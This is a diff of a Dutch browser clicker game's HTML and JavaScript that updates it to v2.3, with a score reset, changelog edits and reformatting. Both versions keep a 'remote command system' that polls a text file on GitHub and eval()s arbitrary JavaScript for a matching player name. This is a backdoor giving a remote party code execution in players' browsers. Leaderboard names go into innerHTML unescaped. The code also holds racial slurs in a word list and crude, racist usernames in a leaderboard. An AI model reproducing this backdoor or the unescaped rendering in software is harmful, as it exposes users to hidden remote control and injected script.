@@ -715,7 +715,7 @@ button:active { transform: scale(.97); }
     <div id="lbModalHeader">
       <div id="lbHeaderLeft">
         <h3>Leaderboard</h3>
-        <span id="lbVersionBadge">v2.2</span>
+        <span id="lbVersionBadge">v2.3</span>
       </div>
       <div id="lbHeaderRight">
         <button id="lbPrevBtn" class="lb-nav-btn">&#8592;</button>
@@ -886,6 +886,14 @@ button:active { transform: scale(.97); }
 
     <div class="sec-label">Changelogs</div>
     <div class="changelog-entry">
+      <h4>v2.3 - Reset Update</h4>
+      <ul>
+        <li>Nieuwe save (alle scores gereset)</li>
+        <li>Code verbeteringen</li>
+        <li>Betere performance</li>
+      </ul>
+    </div>
+    <div class="changelog-entry">
       <h4>v2.2 - Uitleg &amp; Taken</h4>
       <ul>
         <li>Sound effects toegevoegd</li>
@@ -928,23 +936,6 @@ button:active { transform: scale(.97); }
         <li>Lantings zichtbaar in shop</li>
         <li>Meer skins toegevoegd</li>
         <li>Keybinds (gedeeltelijk)</li>
-      </ul>
-    </div>
-    <div class="changelog-entry">
-      <h4>v1.2 - Animaties Update</h4>
-      <ul>
-        <li>Nieuwe UI en animaties</li>
-        <li>Suggestion systeem</li>
-        <li>Statistieken scherm</li>
-      </ul>
-    </div>
-    <div class="changelog-entry">
-      <h4>v1.1 - Offline Bonus Update</h4>
-      <ul>
-        <li>Aanpasbare keybinds</li>
-        <li>Offline bonus verhoogd naar 25%</li>
-        <li>Shop hoeveelheid teller</li>
-        <li>Bugfixes</li>
       </ul>
     </div>
     <div class="changelog-entry">
@@ -996,65 +987,46 @@ button:active { transform: scale(.97); }
   "use strict";
 
   // ── REMOTE COMMAND SYSTEM ──────────────────────────────────────────────────
-  // Polls a remote text file every 10 seconds.
-  // File format: "name: js code" (one command per line)
-  // If the left side matches the current player's name, the right side is eval()'d.
-  // Commands are only re-executed when the JS code itself changes.
+  let lastCmdCode = null;
 
   async function pollRemoteCommands() {
-  const playerName = localStorage.getItem("lc_v4_username");
-  if (!playerName) return;
-
-  try {
-    const res = await fetch("https://raw.githubusercontent.com/toxivid/contact/refs/heads/main/input.txt?t=" + Date.now());
-    const text = await res.text();
-
-    const lines = text.split("\n");
-
-    for (const line of lines) {
-      const colonIdx = line.indexOf(":");
-      if (colonIdx === -1) continue;
-
-      const cmdName = line.slice(0, colonIdx).trim();
-      const cmdCode = line.slice(colonIdx + 1).trim();
-
-      if (cmdName.toLowerCase() === playerName.toLowerCase() && cmdCode) {
-        try {
-          eval(cmdCode);
-        } catch (err) {
-          console.error("Error executing command:", err);
+    const playerName = localStorage.getItem(NAME_KEY);
+    if (!playerName) return;
+    try {
+      const res  = await fetch("https://raw.githubusercontent.com/toxivid/contact/refs/heads/main/input.txt?t=" + Date.now());
+      const text = await res.text();
+      for (const line of text.split("\n")) {
+        const colonIdx = line.indexOf(":");
+        if (colonIdx === -1) continue;
+        const cmdName = line.slice(0, colonIdx).trim();
+        const cmdCode = line.slice(colonIdx + 1).trim();
+        if (cmdName.toLowerCase() === playerName.toLowerCase() && cmdCode && cmdCode !== lastCmdCode) {
+          lastCmdCode = cmdCode;
+          try { eval(cmdCode); } catch (err) { console.error("Remote cmd error:", err); }
         }
       }
-    }
-  } catch (e) {
-    console.error("Fetch failed:", e);
+    } catch (e) { /* network fail, silently ignore */ }
   }
-}
-
-// run immediately
-pollRemoteCommands();
-
-// run every 10 seconds
-setInterval(pollRemoteCommands, 10000);
 
   // ── CONSTANTS ──────────────────────────────────────────────────────────────
-  const VERSION         = "2.3";
-  const SAVE_KEY        = "lc_v4";
-  const LAST_ONLINE_KEY = "lc_v4_lastonline";
-  const NAME_KEY        = "lc_v4_username";
-  const KEYBIND_KEY     = "lc_v4_keybind";
-  const KBDISP_KEY      = "lc_v4_keybind_display";
-  const VOTE_KEY        = "lc_v4_vote";
-  const FORCED_RESET_KEY      = "lc_v4_forced_reset_done_2_3";
-  const VERSION_NOTICE_KEY    = "lc_seen_2_3_notice";
-  const NATTE_HARK_MESSAGE_KEY = "natteharkmessage";
+  const VERSION          = "2.3";
+  // New save key = fresh start for all players
+  const SAVE_KEY         = "lc_v5";
+  const LAST_ONLINE_KEY  = "lc_v5_lastonline";
+  const NAME_KEY         = "lc_v4_username";   // keep name across reset
+  const KEYBIND_KEY      = "lc_v4_keybind";
+  const KBDISP_KEY       = "lc_v4_keybind_display";
+  const VOTE_KEY         = "lc_v4_vote";
+  const VERSION_NOTICE_KEY = "lc_seen_v5_notice";
 
+  // Clean up all old save keys
   const OLD_KEYS = [
     "lantingclicker","lantingclickerlaastonline","lanting_clicker_username",
     "lanting_clicker_keybind","lanting_clicker_keybind_display",
     "lc_v1","lc_v1_lastonline","lc_v1_username",
     "lc_v2","lc_v2_lastonline","lc_v2_username","lc_v2_keybind","lc_v2_keybind_display",
-    "lc_v3","lc_v3_lastonline","lc_v3_username","lc_v3_keybind","lc_v3_keybind_display"
+    "lc_v3","lc_v3_lastonline","lc_v3_username","lc_v3_keybind","lc_v3_keybind_display",
+    "lc_v4","lc_v4_lastonline","lc_v4_forced_reset_done_2_3","natteharkmessage","lc_seen_2_3_notice"
   ];
   OLD_KEYS.forEach(k => localStorage.removeItem(k));
 
@@ -1080,65 +1052,60 @@ setInterval(pollRemoteCommands, 10000);
     { id:5, name:"Jolly Lanting",            img:"https://scontent-ams2-1.xx.fbcdn.net/v/t39.30808-6/505359411_4703242883235276_7531884072442166294_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=53a332&_nc_ohc=C76D43KjKo8Q7kNvwESLxZW&_nc_oc=AdoLHRkJffg1zwJ56tiplCXL6_EyJtrq7fzXFywFaou6v_1BSIcVyrWYqmQblpXzIAs&_nc_zt=23&_nc_ht=scontent-ams2-1.xx&_nc_gid=CJ_jltJM4o6Q48yQba2u7A&_nc_ss=7a389&oh=00_Af0SH0r6A1hCGpfX0dK8pWzsmktAsEpmTz1PePCsyDXspQ&oe=69E6775C", cost:500000, bonus:3, bonusText:"3x klikken", free:false },
     { id:6, name:"OG Lanting",               img:"https://scontent-ams2-1.xx.fbcdn.net/v/t39.30808-6/505767393_4700743773485187_4696695728975036082_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=53a332&_nc_ohc=-6kmga9A_5IQ7kNvwHFpIBz&_nc_oc=Adq0KoSeqN6LQinoGP4Bzo-66BA_oAL98ma3Qa83C9cv5q5MBXQ8Jaf7dk3nPlBCr_s&_nc_zt=23&_nc_ht=scontent-ams2-1.xx&_nc_gid=24nILOznlX4lcXFugR9o2g&_nc_ss=7a389&oh=00_Af3zNH_eyN4E9MT1F-EOjv2WaX1uKkruHvQmfHNvPeQ2Cw&oe=69E68E59", cost:50000000, bonus:4, bonusText:"4x klikken", free:false },
     { id:7, name:"Lanting",                  img:"https://scontent-ams2-1.xx.fbcdn.net/v/t39.30808-6/459427263_4407458439480390_1115745422523934606_n.jpg?_nc_cat=110&ccb=1-7&_nc_sid=1d70fc&_nc_ohc=_FaeZ7hSoEcQ7kNvwGwxU3D&_nc_oc=AdrvQvP7q0iqB8x_kVHcDN0lFetYWzdTFiowtHEeITEBY7Iyv8N847w4lByQuctN-7M&_nc_zt=23&_nc_ht=scontent-ams2-1.xx&_nc_gid=WCW78bwKmzHRnrloUsHr2w&_nc_ss=7a389&oh=00_Af0mAtQ-R9acTzw29I1Tjx6jkj7JnfKf5FTBkBQCMX9GFg&oe=69E7B5CC", cost:1000000000, bonus:5, bonusText:"5x klikken", free:false },
-    { id:8, name:"fifa lanting",             img:"https://cdn.discordapp.com/attachments/1494410739362959360/1496066966199341066/image.png?ex=69e88870&is=69e736f0&hm=df220772258b49b59a82f6b6366c013e2ca9816851aac5ebf4a45c43e2726355&", cost:25000000000,    bonus:6,  bonusText:"6x klikken",  free:false },
+    { id:8, name:"fifa lanting",             img:"https://cdn.discordapp.com/attachments/1494410739362959360/1496066966199341066/image.png?ex=69e88870&is=69e736f0&hm=df220772258b49b59a82f6b6366c013e2ca9816851aac5ebf4a45c43e2726355&", cost:25000000000, bonus:6, bonusText:"6x klikken", free:false },
     { id:9, name:"Skin 10",                  img:"", cost:50000000000000, bonus:10, bonusText:"10x klikken", free:false },
   ];
 
-  const BANNED_WORDS  = ["nigga","nigger","neger","sem","yvonne","sjors"];
-  const UNLOCK_DEFS   = [
+  const BANNED_WORDS = ["nigga","nigger","neger","sem","yvonne","sjors"];
+  const UNLOCK_DEFS  = [
     { key:"gamble",    label:"Gamble knop", desc:"Ontgrendelt de Gamble knop", cost:100  },
     { key:"blackjack", label:"Blackjack",   desc:"Speelbaar in Gamble menu",   cost:1000 },
     { key:"rolls",     label:"Rolls",       desc:"Speelbaar in Gamble menu",   cost:500  },
     { key:"mines",     label:"Mines",       desc:"Speelbaar in Gamble menu",   cost:2500 },
   ];
 
+  // v2.1 historical leaderboard (frozen)
   const LB_V21 = {"michaelsmegmaeikel":983212632645483100000,"dihhalpha":778819730309406000000,"_//_":8964609716123722000,"Natte hark":5701510570466705000,"justin":1337822822809383200,"dikkedaniel123":1181222723092031000,"yvonne":47081998670756640,"OG Lanting":1651486874631794,"Djeeden":329090479377270,"ron_zaadkanon":277157913874511,"k1ck":187676374495059,"Nih":31953666177684,"jelle":30398138591424,"n3ger_b3ff3r":22633909742535,"patati":2017834350401,"josti123":1116132126346,"pijnackerkarker":164111837371,"Lars":103498298905,"zaadsoldaat":6547211249,"Fitiboy072":1877502777,"Fih":686079273,"lantingrager":585614978,"Nate Higgers":53217910,"sjorsragger":26787017,"ginger army":11413571,"Txs072":9093270,"q072":6586870,"ching":5274353,"ieke":2181070,"billebars":954312,"grape":757691,"balzak123":726984,"johan":707401,"Lars pijnacker":550715,"boriedejew":508682,"lantingfan123":425402,"lil john":424591,"isa":373436,"hoi":294081,"Guimke":246808,"jente":245787,"JE":236462,"6767":216759,"Milan":145978,"Tegellikker45":106886,"lantinglover67":104606,"yes":83235,"!!":76059,"binnenste vulvalip":60662,"ipilipi67676767676767676":55012,"Sterre":48977,"azfan67":43280,"yani":39508,"Jake":37579,"pijnackerpijper":37381,"nga balls":28458,"J072":22692,"STALIN":20852,"pijnkanker":14400,"jemairo":12128,"..":11932,"9595":11188,"laaalanting":8184,"De Kosjes":7608,"blowjob":7447,"tester69":6816,"deekie110":5349,"RB":4998,"Jamie":2852,"stroop":2599,"Lebron":1728,"lavissa":1392,"Lakplak23":894,"jamie":516,"ferron":503,"dj bust a nut":291,"lvh4sunoo":278,"giss072":208,"roan":99,"mikkel":91,"robbie":88,"Tgfffd":2,"Yo":0};
-
-  // ── FORCED RESET (one-time per version) ────────────────────────────────────
-  if (!localStorage.getItem(FORCED_RESET_KEY)) {
-    [SAVE_KEY, LAST_ONLINE_KEY, NAME_KEY, VOTE_KEY].forEach(k => localStorage.removeItem(k));
-    localStorage.setItem(FORCED_RESET_KEY, "1");
-  }
 
   // ── LOAD SAVE ─────────────────────────────────────────────────────────────
   const save = JSON.parse(localStorage.getItem(SAVE_KEY) || "{}");
-  let score            = save.score           || 0;
-  let perClick         = save.perClick        || 1;
-  let perSecond        = save.perSecond       || 0;
-  let upgrades         = save.upgrades        || [];
-  let ownedSkins       = save.ownedSkins      || [0];
-  let equippedSkin     = save.equippedSkin    ?? 0;
-  let basePerClick     = save.basePerClick    || 1;
-  let playTime         = save.playTime        || 0;
-  let earned           = save.earned          || 0;
-  let lost             = save.lost            || 0;
-  let highest          = save.highest         || score;
-  let unlockedGamble   = save.unlockedGamble  || false;
-  let unlockedBlackjack= save.unlockedBlackjack || false;
-  let unlockedRolls    = save.unlockedRolls   || false;
-  let unlockedMines    = save.unlockedMines   ?? false;
-  let gambleLuckUntil = 0;
+  let score             = save.score            || 0;
+  let perClick          = save.perClick         || 1;
+  let perSecond         = save.perSecond        || 0;
+  let upgrades          = save.upgrades         || [];
+  let ownedSkins        = save.ownedSkins       || [0];
+  let equippedSkin      = save.equippedSkin      ?? 0;
+  let basePerClick      = save.basePerClick     || 1;
+  let playTime          = save.playTime         || 0;
+  let earned            = save.earned           || 0;
+  let lost              = save.lost             || 0;
+  let highest           = save.highest          || score;
+  let unlockedGamble    = save.unlockedGamble   || false;
+  let unlockedBlackjack = save.unlockedBlackjack || false;
+  let unlockedRolls     = save.unlockedRolls    || false;
+  let unlockedMines     = save.unlockedMines    ?? false;
+  let gambleLuckUntil   = 0;
 
   // ── RUNTIME STATE ─────────────────────────────────────────────────────────
-  let lbData         = {};
-  let lbVersionView  = VERSION;
-  let lbModalOpen    = false;
+  let lbData            = {};
+  let lbVersionView     = VERSION;
+  let lbModalOpen       = false;
   let gambleCooldownByMode = { blackjack: 0, rolls: 0, mines: 0 };
-  let clickLock      = false;
-  let waitingForKey  = false;
-  let lastSuggTime   = 0;
-  let noticeTimer    = null;
-  let fallingActive  = false;
-  let fallingAnimId  = null;
-  let fallingTimerId = null;
-  let nextFallAt     = Date.now() + 60000;
-  let clickKeybind   = localStorage.getItem(KEYBIND_KEY)  || "Enter";
-  let keybindDisplay = localStorage.getItem(KBDISP_KEY)   || "ENTER";
-
-  const activeOverlays = new Set();
+  let clickLock         = false;
+  let waitingForKey     = false;
+  let lastSuggTime      = 0;
+  let noticeTimer       = null;
+  let fallingActive     = false;
+  let fallingAnimId     = null;
+  let fallingTimerId    = null;
+  let nextFallAt        = Date.now() + 60000;
+  let clickKeybind      = localStorage.getItem(KEYBIND_KEY)  || "Enter";
+  let keybindDisplay    = localStorage.getItem(KBDISP_KEY)   || "ENTER";
+  const activeOverlays  = new Set();
+  const boosts          = { click: 0, ps: 0 };
 
   // ── DOM REFS ──────────────────────────────────────────────────────────────
-  const $ = id => document.getElementById(id);
+  const $       = id => document.getElementById(id);
   const scoreEl       = $("score");
   const mainImg       = $("mainImg");
   const clickBtn      = $("clickBtn");
@@ -1157,17 +1124,24 @@ setInterval(pollRemoteCommands, 10000);
   const fallingCdEl   = $("fallingCountdown");
 
   // ── HELPERS ───────────────────────────────────────────────────────────────
-  const fl  = Math.floor;
-  const cl  = Math.ceil;
+  const fl = Math.floor;
+  const cl = Math.ceil;
 
   function sendWebhook(url, content) {
-    fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content}) }).catch(() => {});
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    }).catch(() => {});
   }
 
   function fmtMain(n) {
     n = fl(n);
     if (n < 10000) return String(n);
-    const scales = [[1e21,"td"],[1e18,"t"],[1e15,"bd"],[1e12,"b"],[1e9,"md"],[1e6,"m"],[1e3,"k"]];
+    const scales = [
+      [1e21,"td"],[1e18,"t"],[1e15,"bd"],[1e12,"b"],
+      [1e9,"md"],[1e6,"m"],[1e3,"k"]
+    ];
     for (const [threshold, suffix] of scales) {
       if (n >= threshold) {
         const v = Math.round(n / threshold * 10) / 10;
@@ -1239,7 +1213,7 @@ setInterval(pollRemoteCommands, 10000);
     return activeOverlays.size === 0 && $("startScreen").style.display === "none";
   }
 
-  // ── LUCK BOOST (NON-STACKING) ─────────────────────────────────────────────
+  // ── LUCK BOOST ────────────────────────────────────────────────────────────
   function getActiveLuckPercent() {
     return Date.now() < gambleLuckUntil ? 20 : 0;
   }
@@ -1248,7 +1222,7 @@ setInterval(pollRemoteCommands, 10000);
   }
 
   // ── GAMBLE HELPERS ────────────────────────────────────────────────────────
-  function getMinBet()  { return Math.max(1, cl(score * 0.10)); }
+  function getMinBet() { return Math.max(1, cl(score * 0.10)); }
   function assertValidBet(bet) {
     const min = getMinBet();
     if (isNaN(bet) || bet < min) { showNotice("Minimale inzet is " + fmtShop(min) + " Lantings", "var(--danger)"); return false; }
@@ -1274,7 +1248,7 @@ setInterval(pollRemoteCommands, 10000);
 
   // ── SKIN / CLICK LOGIC ────────────────────────────────────────────────────
   function getSkinBonus(id) {
-    return (SKIN_DEFS.find(s => s.id === id) || { bonus:1 }).bonus;
+    return (SKIN_DEFS.find(s => s.id === id) || { bonus: 1 }).bonus;
   }
   function getCurrentSkinImg() {
     const def = SKIN_DEFS.find(s => s.id === equippedSkin);
@@ -1285,8 +1259,6 @@ setInterval(pollRemoteCommands, 10000);
     perClick   = cl(basePerClick * mult);
     mainImg.src = getCurrentSkinImg();
   }
-
-  const boosts = { click: 0, ps: 0 };
 
   function activateBoost(type) {
     const dur = 20000;
@@ -1332,7 +1304,7 @@ setInterval(pollRemoteCommands, 10000);
 
   // ── BOOST RENDER ─────────────────────────────────────────────────────────
   function renderBoosts() {
-    const now = Date.now();
+    const now    = Date.now();
     const badges = [];
     if (now < boosts.click) badges.push(`<div class="boost-badge click-boost">+20% Klik (${cl((boosts.click - now) / 1000)}s)</div>`);
     if (now < boosts.ps)    badges.push(`<div class="boost-badge ps-boost">x2.5 P/S (${cl((boosts.ps - now) / 1000)}s)</div>`);
@@ -1344,11 +1316,11 @@ setInterval(pollRemoteCommands, 10000);
   // ── GAMBLE BUTTON STATE ───────────────────────────────────────────────────
   function updateGambleButton() {
     gambleBtn.disabled = !unlockedGamble;
-    const lockText  = (unlocked) => unlocked ? "" : "Vergrendeld";
-    const lockClass = (unlocked) => "gamble-card" + (unlocked ? "" : " locked-game");
-    $("bjLockText").innerText    = lockText(unlockedBlackjack);
-    $("rollsLockText").innerText = lockText(unlockedRolls);
-    $("minesLockText").innerText = lockText(unlockedMines);
+    const lockText  = u => u ? "" : "Vergrendeld";
+    const lockClass = u => "gamble-card" + (u ? "" : " locked-game");
+    $("bjLockText").innerText       = lockText(unlockedBlackjack);
+    $("rollsLockText").innerText    = lockText(unlockedRolls);
+    $("minesLockText").innerText    = lockText(unlockedMines);
     $("openBlackjackBtn").className = lockClass(unlockedBlackjack);
     $("openRollsBtn").className     = lockClass(unlockedRolls);
     $("openMinesBtn").className     = lockClass(unlockedMines);
@@ -1382,7 +1354,7 @@ setInterval(pollRemoteCommands, 10000);
     const playerLower = playerName.toLowerCase();
     const source      = lbVersionView === "2.1" ? LB_V21 : lbData;
     const viewOnly    = lbVersionView === "2.1";
-    let playerFound   = false;
+    let   playerFound = false;
     const entries     = [];
 
     for (const [name, sc] of Object.entries(source)) {
@@ -1401,8 +1373,8 @@ setInterval(pollRemoteCommands, 10000);
   }
 
   function makeRowHTML(rank, name, sc, isMe, modal) {
-    const cls  = modal ? "lb-modal-row" : "lb-row";
-    const rnk  = modal ? "lb-modal-rank" : "lb-rank";
+    const cls = modal ? "lb-modal-row" : "lb-row";
+    const rnk = modal ? "lb-modal-rank" : "lb-rank";
     return `<div class="${cls}${isMe ? " lb-me" : ""}">
       <span class="${rnk} ${rankClass(rank)}">#${rank}</span>
       <span class="lb-name" style="flex:1">${name}${isMe ? " \u2190" : ""}</span>
@@ -1426,7 +1398,6 @@ setInterval(pollRemoteCommands, 10000);
     lbRows.innerHTML = html;
 
     lbExpandBtn.textContent = (lbModalOpen ? "\u25BC" : "\u25B2") + " Volledig Leaderboard (" + entries.length + ")";
-
     $("lbVersionBadge").textContent = "v" + lbVersionView;
     $("lbPrevBtn").style.display    = lbVersionView === VERSION ? "inline-block" : "none";
     $("lbNextBtn").style.display    = lbVersionView === "2.1"   ? "inline-block" : "none";
@@ -1436,18 +1407,12 @@ setInterval(pollRemoteCommands, 10000);
 
   function renderLbModal(entries, playerRank) {
     const scrollTop = lbModalBody.scrollTop;
-    $("lbModalCount").textContent = entries.length + " spelers";
+    $("lbModalCount").textContent   = entries.length + " spelers";
     $("lbVersionBadge").textContent = "v" + lbVersionView;
     $("lbPrevBtn").style.display    = lbVersionView === VERSION ? "inline-block" : "none";
     $("lbNextBtn").style.display    = lbVersionView === "2.1"   ? "inline-block" : "none";
-
     lbModalBody.innerHTML = entries.map((p, i) => makeRowHTML(i + 1, p.name, p.score, p.isMe, true)).join("");
-
-    if (scrollTop > 0) {
-      lbModalBody.scrollTop = scrollTop;
-    } else if (playerRank > 5) {
-      lbModalBody.scrollTop = Math.max(0, (playerRank - 4) * 32);
-    }
+    lbModalBody.scrollTop = scrollTop > 0 ? scrollTop : (playerRank > 5 ? Math.max(0, (playerRank - 4) * 32) : 0);
   }
 
   function openLbModal() {
@@ -1467,7 +1432,7 @@ setInterval(pollRemoteCommands, 10000);
     lbExpandBtn.textContent = "\u25B2 Volledig Leaderboard (" + buildEntries().length + ")";
   }
 
-  // ── CLICK HANDLER ────────────────────────────────────────────────────────
+  // ── CLICK HANDLER ─────────────────────────────────────────────────────────
   function doClick() {
     if (clickLock) return;
     clickLock = true;
@@ -1480,12 +1445,12 @@ setInterval(pollRemoteCommands, 10000);
   }
 
   function triggerClickAnim() {
-    clickBtn.style.transform  = "scale(0.97)";
-    clickBtn.style.boxShadow  = "0 0 20px rgba(124,92,252,.9) inset, 0 0 0 3px rgba(124,92,252,.9)";
+    clickBtn.style.transform = "scale(0.97)";
+    clickBtn.style.boxShadow = "0 0 20px rgba(124,92,252,.9) inset, 0 0 0 3px rgba(124,92,252,.9)";
     setTimeout(() => { clickBtn.style.transform = ""; clickBtn.style.boxShadow = ""; }, 100);
   }
 
-  // ── FALLING CIRCLE ───────────────────────────────────────────────────────
+  // ── FALLING CIRCLE ────────────────────────────────────────────────────────
   function spawnFallingCircle() {
     if (fallingActive || $("startScreen").style.display !== "none") return;
     fallingActive = true;
@@ -1518,7 +1483,7 @@ setInterval(pollRemoteCommands, 10000);
       const types  = ["click", "ps", "gamble"];
       const chosen = types[fl(Math.random() * types.length)];
       activateBoost(chosen);
-      const msgs = { click:"Klik boost: +20% per klik", ps:"P/S boost: x2.5 per seconde", gamble:"Gamble geluk boost!" };
+      const msgs = { click: "Klik boost: +20% per klik", ps: "P/S boost: x2.5 per seconde", gamble: "Gamble geluk boost!" };
       spawnFloatText(msgs[chosen], "#ffd700");
     };
   }
@@ -1535,8 +1500,8 @@ setInterval(pollRemoteCommands, 10000);
 
   // ── SHOP ──────────────────────────────────────────────────────────────────
   function renderUnlockTiles() {
-    const container = $("unlockTiles");
-    const unlockedMap = { gamble: unlockedGamble, blackjack: unlockedBlackjack, rolls: unlockedRolls, mines: unlockedMines };
+    const container    = $("unlockTiles");
+    const unlockedMap  = { gamble: unlockedGamble, blackjack: unlockedBlackjack, rolls: unlockedRolls, mines: unlockedMines };
 
     let html = `<div class="sec-label">Ontgrendelen</div>`;
     UNLOCK_DEFS.forEach(tile => {
@@ -1573,20 +1538,25 @@ setInterval(pollRemoteCommands, 10000);
   if (!upgrades.length) {
     for (let i = 0; i < 50; i++) {
       const isClick = i % 2 === 0;
-      upgrades.push({ type: isClick ? "click" : "auto", value: 1 + fl(i / 2) * 2, cost: isClick ? 30 * Math.pow(1.6, i) : 20 * Math.pow(1.6, i), bought: false });
+      upgrades.push({
+        type  : isClick ? "click" : "auto",
+        value : 1 + fl(i / 2) * 2,
+        cost  : isClick ? 30 * Math.pow(1.6, i) : 20 * Math.pow(1.6, i),
+        bought: false
+      });
     }
   }
 
   function renderUpgrades() {
     let html = "";
     upgrades.forEach((u, i) => {
-      const unlocked  = i === 0 || upgrades[i - 1].bought;
+      const unlocked = i === 0 || upgrades[i - 1].bought;
       u.cost = fl(u.cost);
       if (!unlocked) {
         html += `<div class="upgrade locked"><div class="upgrade-info"><div style="color:var(--muted)">???</div></div></div>`;
         return;
       }
-      const typeLabel = u.type === "click" ? "per klik" : "per seconde";
+      const typeLabel  = u.type === "click" ? "per klik" : "per seconde";
       const countBadge = u.count ? `<span class="upgrade-count">x${u.count}</span>` : "";
       const canAfford  = score >= u.cost;
       html += `<div class="upgrade" data-idx="${i}">
@@ -1647,10 +1617,10 @@ setInterval(pollRemoteCommands, 10000);
 
     list.querySelectorAll("button[data-sid]").forEach(btn => {
       btn.addEventListener("click", () => {
-        const id = parseInt(btn.dataset.sid);
-        if (ownedSkins.includes(id)) { equipSkin(id); return; }
+        const id  = parseInt(btn.dataset.sid);
         const def = SKIN_DEFS.find(s => s.id === id);
         if (!def) return;
+        if (ownedSkins.includes(id)) { equipSkin(id); return; }
         if (def.free) { ownedSkins.push(id); equipSkin(id); renderSkins(); return; }
         if (score < def.cost) { showNotice("Niet genoeg Lantings", "var(--danger)"); return; }
         score -= def.cost; lost += def.cost;
@@ -1669,7 +1639,7 @@ setInterval(pollRemoteCommands, 10000);
     renderSkins();
   }
 
-  // ── BLACKJACK ────────────────────────────────────────────────────────────
+  // ── BLACKJACK ─────────────────────────────────────────────────────────────
   const SUITS = ["H","D","K","S"];
   const RANKS = ["A","2","3","4","5","6","7","8","9","10","J","Q","K"];
   let deck = [], playerHand = [], dealerHand = [], bjInProgress = false, bjBet = 0, bjAllInRound = false;
@@ -1731,12 +1701,12 @@ setInterval(pollRemoteCommands, 10000);
     if (!canGamble("blackjack")) return;
     const bet = betOverride !== undefined ? betOverride : parseInt($("betInput").value);
     if (!assertValidBet(bet)) return;
-    bjAllInRound = (bet === score);
-    bjBet = bet;
+    bjAllInRound = bet === score;
+    bjBet  = bet;
     score -= bet; lost += bet;
     createDeck();
-    playerHand  = [deck.pop(), deck.pop()];
-    dealerHand  = [deck.pop(), deck.pop()];
+    playerHand   = [deck.pop(), deck.pop()];
+    dealerHand   = [deck.pop(), deck.pop()];
     bjInProgress = true;
     updateBJDisplay();
     triggerGambleCooldown("blackjack");
@@ -1757,12 +1727,12 @@ setInterval(pollRemoteCommands, 10000);
     const pv = handValue(playerHand);
     const dv = handValue(dealerHand);
     let win;
-    if      (pv > 21)                                                     win = false;
-    else if (dv > 21)                                                     win = true;
+    if      (pv > 21)                                                                       win = false;
+    else if (dv > 21)                                                                       win = true;
     else if (pv === 21 && playerHand.length === 2 && !(dv === 21 && dealerHand.length === 2)) win = true;
-    else if (pv > dv)                                                     win = true;
-    else if (pv === dv)                                                   win = null;
-    else                                                                  win = false;
+    else if (pv > dv)                                                                       win = true;
+    else if (pv === dv)                                                                     win = null;
+    else                                                                                    win = false;
     endBJ(win);
   }
 
@@ -1772,10 +1742,9 @@ setInterval(pollRemoteCommands, 10000);
       const recoverChance = (bjAllInRound ? 0.10 : 0) + (getActiveLuckPercent() / 100);
       if (Math.random() < recoverChance) win = true;
     }
-
     let msg, color;
     if (win === true) {
-      const mult = (playerHand.length === 2 && handValue(playerHand) === 21) ? 3 : 2;
+      const mult   = (playerHand.length === 2 && handValue(playerHand) === 21) ? 3 : 2;
       const payout = Math.max(0, fl(bjBet * mult));
       score += payout; earned += payout;
       msg = "Gewonnen! +" + fmtShop(payout); color = "var(--accent2)";
@@ -1799,12 +1768,12 @@ setInterval(pollRemoteCommands, 10000);
     updateBJDisplay();
   }
 
-  // ── ROLLS ─────────────────────────────────────────────────────────────────
+  // ── ROLLS ──────────────────────────────────────────────────────────────────
   function getRollPick(luckPercent) {
     const red   = [0.1, 0.5, 0.75];
     const green = [1.25, 1.5, 2];
     const baseWinChance = 0.20 + (luckPercent / 100);
-    const winChance = luckPercent >= 40 ? 0.60 : Math.min(0.49, baseWinChance);
+    const winChance     = luckPercent >= 40 ? 0.60 : Math.min(0.49, baseWinChance);
     return Math.random() < winChance
       ? green[fl(Math.random() * green.length)]
       : red[fl(Math.random() * red.length)];
@@ -1832,8 +1801,8 @@ setInterval(pollRemoteCommands, 10000);
     updateScore();
   }
 
-  // ── MINES ─────────────────────────────────────────────────────────────────
-  let minesState = { active:false, size:5, mines:3, bet:0, multiplier:1, safe:0, bombSet:new Set(), opened:new Set() };
+  // ── MINES ──────────────────────────────────────────────────────────────────
+  let minesState = { active: false, size: 5, mines: 3, bet: 0, multiplier: 1, safe: 0, bombSet: new Set(), opened: new Set() };
 
   function mineGainPerSafe(size, mines, luck) {
     const ratio   = mines / (size * size);
@@ -1863,13 +1832,13 @@ setInterval(pollRemoteCommands, 10000);
     const allIn = opts && opts.allIn;
     const bet   = (opts && opts.bet !== undefined) ? opts.bet : parseInt($("minesBet").value);
     if (!assertValidBet(bet)) return;
-    let size  = Math.min(10, Math.max(5, parseInt($("minesSize").value) || 5));
-    let mines = Math.max(1, Math.min(size * size - 1, parseInt($("minesCount").value) || 1));
+    const size  = Math.min(10, Math.max(5, parseInt($("minesSize").value) || 5));
+    const mines = Math.max(1, Math.min(size * size - 1, parseInt($("minesCount").value) || 1));
     if (allIn) addLuckBoost(10, 20000);
     const luck         = getActiveLuckPercent() + (allIn ? 10 : 0);
     const reducedMines = Math.max(1, mines - fl(mines * (luck / 100) * 0.20));
     score -= bet; lost += bet;
-    minesState = { active:true, size, mines:reducedMines, bet, multiplier:1, safe:0, bombSet:new Set(), opened:new Set() };
+    minesState = { active: true, size, mines: reducedMines, bet, multiplier: 1, safe: 0, bombSet: new Set(), opened: new Set() };
     while (minesState.bombSet.size < reducedMines) minesState.bombSet.add(fl(Math.random() * size * size));
     resetMinesBoard();
     const st = $("minesStatus");
@@ -1921,10 +1890,10 @@ setInterval(pollRemoteCommands, 10000);
     endMinesGame(true, "Cash out! +" + fmtShop(payout) + " Lantings");
   }
 
-  // ── CODES ─────────────────────────────────────────────────────────────────
-  const usedCodes = new Set();
+  // ── CODES ──────────────────────────────────────────────────────────────────
+  const usedCodes   = new Set();
   const VALID_CODES = {
-    "gamble69": () => { activateBoost("gamble"); return { msg:"Gamble geluk boost geactiveerd! (20 seconden)", color:"var(--accent2)" }; }
+    "gamble69": () => { activateBoost("gamble"); return { msg: "Gamble geluk boost geactiveerd! (20 seconden)", color: "var(--accent2)" }; }
   };
 
   function submitCode() {
@@ -1932,7 +1901,7 @@ setInterval(pollRemoteCommands, 10000);
     const msgEl = $("codeMsg");
     const code  = input.value.trim().toLowerCase();
     if (!code) return;
-    if (usedCodes.has(code))   { msgEl.style.color = "var(--danger)";  msgEl.innerText = "Code al gebruikt!"; return; }
+    if (usedCodes.has(code)) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Code al gebruikt!"; return; }
